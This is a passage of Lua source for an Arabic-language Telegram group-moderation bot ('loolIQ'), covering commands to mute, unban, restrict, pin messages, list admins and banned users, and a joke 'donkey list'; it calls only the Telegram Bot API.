text = '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
end
DevAbs:srem(loolIQ..abs, result.id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(apid[2],ungban_by_username)
end
--     Source loolIQ     --
if text:match("^[Uu]nbanall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Uu]nbanall) (%d+)$")}
local gps = DevAbs:scard(loolIQ.."bot:groups")
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
local abs = 'bot:gban:'
DevAbs:srem(loolIQ..abs, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been unbanned (Gban) \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم ٱڵغٱء حظرة من ( '..gps..' ) مجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
--     Source loolIQ     --
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ لٱ تستطيع كتمي', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⚠️ ⌯ لٱ تستطيع كتم ( ['..absc9..'] )\n❗️🚸 ⌯ لٱنه يمتڵك ٱحدى ٱڵـرتب : \n{ مميز • ادمن • مدير • منشئ • مطور }', 1, 'md')
else 
DevAbs:sadd(loolIQ..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source loolIQ     --
if text:match('^كتم @(.*)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
local abs = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_admin(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⚠️ ⌯ لٱ تستطيع كتم ( ['..absc9..'] )\n❗️🚸 ⌯ لٱنه يمتڵك ٱحدى ٱڵـرتب : \n{ مميز • ادمن • مدير • منشئ • مطور }', 1, 'md')
else
if DevAbs:sismember(loolIQ..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ هوَ بٱڵفعڵ مكتوم في ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
else
DevAbs:sadd(loolIQ..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
resolve_username(ap[2],mute_by_username)
end
--     Source loolIQ     --
if text:match("^[Mm]uteuser (%d+)$") then
local ap = {string.match(text, "^([Mm]uteuser) (%d+)$")}
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_, ap[2]) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ is already muted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ هوَ بٱڵفعڵ مكتوم في ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
DevAbs:sadd(loolIQ..'bot:muted:'..msg.chat_id_, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been muted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
--     Source loolIQ     --
local text = msg.content_.text_:gsub('الغاء كتم','Unmuteuser')
if text:match("^[Uu]nmuteuser$") and msg.reply_to_message_id_ ~= 0 then
function unmute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:muted:'..msg.chat_id_
if not DevAbs:sismember(loolIQ..abs, result.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ not muted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ هوَ ڵيس مكتوم ڵيتم كتمة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..abs, result.sender_user_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unmuted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمكتوم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
--     Source loolIQ     --
if text:match("^[Uu]nmuteuser @(.*)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_, result.id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ not muted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ هوَ ڵيس مكتوم ڵيتم كتمة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..'bot:muted:'..msg.chat_id_, result.id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️🚸 ⌯ The User : ( '..result.id_..' )\n❗️🏌🏻‍♂️ ⌯ has been unmuted \n '
else
text = '🎗 ⌯ ٱڵـمكتوم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n '
end
end
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = '*❗️📛 ⌯ Username is not correct *'
else
text = '*❗️📛 ⌯ ٱڵمعرف غير صحيح*'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unmute_by_username)
end
--     Source loolIQ     --
if text:match("^[Uu]nmuteuser (%d+)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) (%d+)$")}
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(loolIQ..'bot:muted:'..msg.chat_id_, ap[2]) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ not muted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ هوَ ڵيس مكتوم ڵيتم كتمة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..'bot:muted:'..msg.chat_id_, ap[2])
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..ap[2]..' )\n❗️🏌🏻‍♂️ ⌯ has been unmuted \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمكتوم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..ap[2]..' ◟\n📣 ⌯ تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
end 
--     Source loolIQ     --
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if DevAbs:sismember(loolIQ..abs, result.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ is now a donky 😹💔 \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ هوَ مطي شرفع منه بعد😹💔 \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ has been a Full donky 😹💔 \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمطٱية \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
DevAbs:sadd(loolIQ..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
--     Source loolIQ     --
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if not DevAbs:sismember(loolIQ..abs, result.sender_user_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The User : ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ is not a donky n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ هوَ ڵيس مطي ڵيتم تنزيڵه \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
DevAbs:srem(loolIQ..abs, result.sender_user_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️🚸 ⌯ The vip: ( '..result.sender_user_id_..' )\n❗️🏌🏻‍♂️ ⌯ was removed from donky list \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمطي ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمطٱية \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") then  
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ لٱ تستطيع تقييدي ', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⚠️ ⌯ لٱ تستطيع تقييد ( ['..absc9..'] )\n❗️🚸 ⌯ لٱنه يمتڵك ٱحدى ٱڵـرتب : \n{ مميز • ادمن • مدير • منشئ • مطور } ', 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
DevAbs:sadd(loolIQ..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم تقييده من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source loolIQ     --
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ يـمـعـود هـذٱ ٱڵـبـوت ', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(loolIQ..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمقيد ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n📣 ⌯ تـۖم ٱڵغٱء تقييده من ٱڵـمجموعة \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
end 
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المقيدين" then 
local hash  =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(loolIQ..hash)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمقيدين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then
text = "❗️📛 ⌯ لٱ يوجد مقيدين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end 
if text == 'حذف المقيدين' and is_admin(msg.sender_user_id_, msg.chat_id_) then     
local abs =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(loolIQ..abs)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbs:srem(loolIQ..'tkeed:'..msg.chat_id_, v)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ تـۖم حـذف ٱڵـمقيدين ', 1, 'md')
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
DevAbs:set(loolIQ..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️☻ تـۖم تثبيت ٱڵـرسٱڵة بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "الادمنيه" or text == "الادمنية" then 
local abs =  'abs:admins'..msg.chat_id_
local list = DevAbs:smembers(loolIQ..abs)
text = "❗️🎒 ⌯ قٱئمة ٱلٱدمنية : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then
text = "❗️📛 ⌯ لٱ يوجد ٱدمنية "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     Source loolIQ     -- 
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين" then 
local list = DevAbs:smembers(loolIQ..'abs:monshid:'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمنشئين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد منشئين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     -- 
if text == "الادمنيه العامين" then 
local abs =  'abs:adminall:'
local list = DevAbs:smembers(loolIQ..abs)
text = "❗️🎒 ⌯ قٱئمة ٱلٱدمنية ٱڵعٱمين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then
text = "❗️📛 ⌯ لٱ يوجد ٱدمنية عٱمين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end  
--     Source loolIQ     --
if text == "المميزين" then 
local list = DevAbs:smembers(loolIQ..'abs:vipmem'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمميزين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد مميزين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     --
if text:match("^[Dd]onkylist$") or text:match("^قائمه المطايه$") or text:match("^المطايه$") then
local abs =  'bot:donky:'..msg.chat_id_
local list = DevAbs:smembers(loolIQ..abs)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = "❗️🎒 ⌯ List of donky : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
else
text = "❗️🎒 ⌯ قٱئمة مطٱية ٱڵمجموعة 😹💔 : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.."⌯ (@"..username..")\n ⌯ ("..v..")\n"
else
text = text..k.."⌯ (@"..username..")\n ⌯ ("..v..")\n"
end
end
if #list == 0 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = "❗️📛 ⌯ List of donky is empty "
else
text = "❗️📛 ⌯ لٱ يوجد مطٱيه كڵهٱ ٱوٱدم 😹💔 "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--     Source loolIQ     --
if text == "المميزين عام" or text == "المميزين العام" then 
local list = DevAbs:smembers(loolIQ..'abs:vipall:')
text = "❗️🎒 ⌯ قٱئمة ٱڵـمميزين ٱڵعٱم : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد مميزين عٱم "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     --
if text == "المكتومين" then 
local list = DevAbs:smembers(loolIQ..'bot:muted:'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمكتومين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد مكتومين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     --
if text == "المدراء" or text == "مدراء" then 
local list = DevAbs:smembers(loolIQ..'abs:owners:'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمدرٱء : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد مدرٱء "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     --
if text == "المدراء العامين" then 
local list = DevAbs:smembers(loolIQ..'abs:ownerall:')
text = "❗️🎒 ⌯ قٱئمة ٱڵـمدرٱء ٱڵعٱمين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد مدرٱء عٱمين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end
--     Source loolIQ     --
if text == "المنشئ" or text == "المنشئين الاساسيين" or text == "منشئين اساسيين" then 
local list = DevAbs:smembers(loolIQ..'abs:monsh:'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵمنشئين ٱلٱسٱسيين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد منشئين ٱسٱسيين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source loolIQ     --
if text == "المحظورين" or text == "المحضورين" then 
local list = DevAbs:smembers(loolIQ..'bot:banned:'..msg.chat_id_)
text = "❗️🎒 ⌯ قٱئمة ٱڵـمحظورين : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد محظورين "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     Source loolIQ     --
if is_sudo(msg) and (text:match("^[Ss]etsupport$") or text:match("^ضع دعم$")) then
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Please Send your *Support link* Or *Support Bot ID* now ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "️❗️🚸 ⌯ ٱرسڵ رٱبط ٱڵكروب ٱو معرف ٱڵـدعم \n❗️🔑 ⌯ ڵيتوٱصڵ معك ٱڵمتٱبعين من خلٱڵه ", 1, "md")
end
DevAbs:setex(loolIQ.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^[Dd]elsupport$") or text:match("^حذف الدعم$")) then
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ Support *Information* Deleted ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حـذف معڵومٱت ٱڵـدعم ", 1, "md")
end
DevAbs:del(loolIQ.."bot:supports:link")
end
--     Source loolIQ     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text == "قائمه العام" or text == "المحظورين عام" then 
local list = DevAbs:smembers(loolIQ..'bot:gban:')
text = "❗️🎒 ⌯ قٱئمة ٱڵـحظر ٱڵعٱم : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(loolIQ.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ (["..username.."])\n ⌯ ("..v..")\n"
end end
if #list == 0 then 
text = "❗️📛 ⌯ لٱ يوجد محظورين عٱم "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
end 
--     Source loolIQ     --
if text == "المطورين" then 
